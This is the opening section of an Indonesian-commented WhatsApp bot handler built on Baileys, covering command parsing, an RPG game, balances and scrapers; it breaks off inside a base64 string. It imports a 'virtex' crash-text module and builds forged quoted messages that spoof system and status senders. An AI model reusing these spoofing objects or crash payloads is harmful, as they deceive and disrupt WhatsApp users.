// ORIGINAL BASE BY SURYA
// RECODE SCRIPT BY znn



// GLOBAL
require('./settings');
require('./lib/funclist');
require('./system/functions');
// MODULE
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage } = global.baileys
const fs = require('fs')
const fg = require('api-dylux')
const toMs = require('ms')
const util = require('util')
const BASE_URL = 'https://aemt.me'
const FormData = require('form-data')
const cheerio = require('cheerio')
const bochil = require('@bochilteam/scraper')
const client = require('filestack-js').init(fileStackApi)
const chalk = require('chalk')
const crypto = require('crypto')
const { exec, spawn, execSync } = require('child_process')
const axios = require('axios')
const path = require('path')
const os = require('os')
//const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const jsobfus = require('javascript-obfuscator');
const speed = require('performance-now')
const moment = require('moment-timezone')
const cron = require('node-cron')
const ms = require('parse-ms')
const rimraf = require('rimraf')
const jimp = require('jimp')
const fetch = require('node-fetch')
const { sizeFormatter } = require('human-readable')
const yts = require('yt-search');
const ytdl = require('ytdl-core');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require('dhn-api')
const Harinih = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)

// LIBRARY - LIB
const { color, bgcolor, mycolor } = require('./lib/color')
const { pinterest } = require("./lib/pinterest")
const anon = require('./lib/menfess')
const scp2 = require('./lib/scraper2')
const { userXp, userLeveling, } = require("./lib/user");
const photooxy = require('./lib/photooxy');
const { TelegraPh } = require('./lib/uploader')
const _sewa = require("./lib/sewa");
//const { anyime } = require("./lib/urutannime.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { savefromV2, ChatGpt, searchfilm,getSurah, tafsir, instagram4, capcutdl, mediafiredll, instagram2, instagram3, cekkuota, tele, ytPlayMp4, ytPlayMp3, textpro,igdl, kodepos, mediafire, ffstalk, mlstalk, Tiktok, surah, listsurah, ephoto, emoji} = require('./lib/scraper') 
const {toFirstCase,isNumber,formatp,parseMention, resize, getRandom,generateProfilePicture, getCase, runtime, FileSize, h2k, makeid, kyun, randomNomor, jsonformat, isUrl, fetchJson, sleep, getBuffer,} = require("./lib/myfunc");
const Kalender91 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)

// CLONE BOT UTAMA
const { znnClone, conns } = require('./cloneBot/clonebot')



// DATABASE GLOBAL USER
const users = global.db.users
const listall = global.db.listall
const stickercmd = global.db.stickercmd
const AntiSpam = global.db.antispam
const spammer = []



// FUNCTION SALDO & DATA
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./database/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
// BATAS SALDO

/// EXPORT MODULE/HOOK FUNCTION

module.exports = async(znn, m, update, store, jid, setting) => {
  const { limitCount } = global.limit
  const { pushname, botNumber, content, senderNumber, from, fromMe, isGc, sender, isBaileys, type } = m
  if (m.key && m.key.remoteJid === 'status@broadcast') return
  if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
  try {
  if (m.key && m.key.remoteJid === 'status@broadcast') return;
  

// SYSTEM HOOK
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'stickerMessage' && stickercmd[m.message.stickerMessage.fileSha256.toString('base64')] !== undefined) ? stickercmd[m.message.stickerMessage.fileSha256.toString('base64')].text : '.'
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '' // di string '' kasih '.' sebelumnya, guna untuk hanya owner yang tidak mengenakan prefix dan pengguna lain menggunakan prefix titik
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const args = body.trim().split(/ +/).slice(1)
const isGroup = m.key.remoteJid.endsWith('@g.us')
const isPc = from.endsWith('@s.whatsapp.net')
const pushname = m.pushName || 'No Name'
const botNumber = znn.user.id.split(':')[0]+'@s.whatsapp.net'
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const isCreator = global.owner.includes(m.sender)
const isOwner = global.owner.includes(m.sender) || (users[m.sender] !== undefined ? users[m.sender].owner : false)

const command = isOwner ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const comand = prefix + command;
const text = args.join(' '), q = args.join(' ');
const quoted = m.quoted ? m.quoted : m;
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const qm = (m.quoted || m)
const _quoted = (qm.type == 'buttonsMessage') ? qm[Object.keys(qm)[1]] : (qm.type == 'templateMessage') ? qm.hydratedTemplate[Object.keys(qm.hydratedTemplate)[1]] : (qm.type == 'product') ? qm[Object.keys(qm)[0]] : m.quoted ? m.quoted : m
const qmsg = (_quoted.msg || _quoted)



// DATABASE RPG GAMES
const { ngazap } = require ('./assets/virtex/ngazap')
let _limit = JSON.parse(fs.readFileSync('./database/rpg/limit.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let _buruan = JSON.parse(fs.readFileSync('./database/rpg/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./database/rpg/darah.json'))
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let _petualang = JSON.parse(fs.readFileSync('./database/rpg/inventory.json'))
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./database/rpg/darah.js')
const { cekInventoryAdaAtauGak } = require('./database/rpg/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./database/rpg/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit } = require('./database/rpg/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./database/rpg/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./database/rpg/rpg.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.senpder)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isSewa = _sewa.checkSewaGroup(from, sewa)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const isPetualang = checkPetualangUser(m.sender)
// SETTING USER RPG
let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'


// BATAS RPG



// FUNCTION WAKTU
let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
    
    
// GROUP METADATA
const groupMetadata = m.isGroup ? await znn.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const groups = global.db.groups[m.chat] !== undefined ? global.db.groups[m.chat] : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;

// FANGSIEN RPG
if (m.isGroup) {
const Fisha = await getMancingIkan(m.sender)
const FishId = await getMancingId(m.sender)
if (Fisha === undefined && FishId === undefined) await addMancingId(m.sender)}

// REGISTER BOT
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const isRegistered = checkRegisteredUser(m.sender)

// AMBIL PP USER
try {
var ppuser = await znn.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'}
let ppnyauser = await getBuffer(ppuser)
let ppUrl = await znn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
    	  

// AUTO SAVE DATABASE
const isBanned = db.users[sender] !== undefined ? db.users[sender].banned : false
const isPremium = db.users[sender] !== undefined ? db.users[sender].premium : false
const isNumber = x => typeof x === 'number' && !isNaN(x)
try {
let user = db.users[sender]
if (user) {
if (typeof user !== 'object') db.users[sender] = {}
if (!('jid' in user)) user.jid = sender
if (!('name' in user)) user.name = pushname
if (!('date' in user)) user.date = calender
if (!isNumber(user.limit)) user.limit = 15
if (!isNumber(user.balance)) user.balance = 10000
if (!('banned' in user)) user.banned = false
if (!('premium' in user)) user.premium = false
if (!isNumber(user.expired)) user.expired = Date.now() + toMs('7d')
} else db.users[sender] = {
jid: sender,
name: pushname,
date: calender,
limit: 15,
balance: 10000,
banned: false,
premium: false,
expired: Date.now() + toMs('7d')
}
} catch (err) {
console.error(err)
}


// FANGSIEN MENTION
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const tag = `@${m.sender.split('@')[0]}`





// FUNCTION SELF
const Cuekin = !0;

// FUNCTION REACT BY znn
let reactionMessage = baileys.proto.Message.ReactionMessage.create({ key: m.key, text: "" })


// READ MORE/BACA SELENGKAPNYA
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

// GET QUOTES ANIME
const resis = await Quotes()

// FUNCTION NOMOR USER
const nomore = m.sender.replace(/[^0-9]/g, '')

// FUNCTION PASSWORD
const pw = crypto.randomBytes(5).toString('hex')


// REPLY API
const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
// REPLY CUSTOM TEXT
const menfes ={key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `${resis.quotes}`}}}
// REPLY WITH TROLI
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: ppnyauser, surface: 200, message: 'znn Bot', orderTitle: 'By znnzation', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'Project znn',jpegThumbnail: ppnyauser}}}
//REPLY WITH VN
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY WITH GIFT
const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'znn Project', "h": 'znn','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'znn Zuberg', 'jpegThumbnail': ppnyauser}}}
// REPLY WITH GROUP LINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "Project znn", "caption": `${pushname}`, 'jpegThumbnail': ppnyauser}}}
// REPLY WITH VIDEO
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title": 'Project znn', "h": 'znn Bot','seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': "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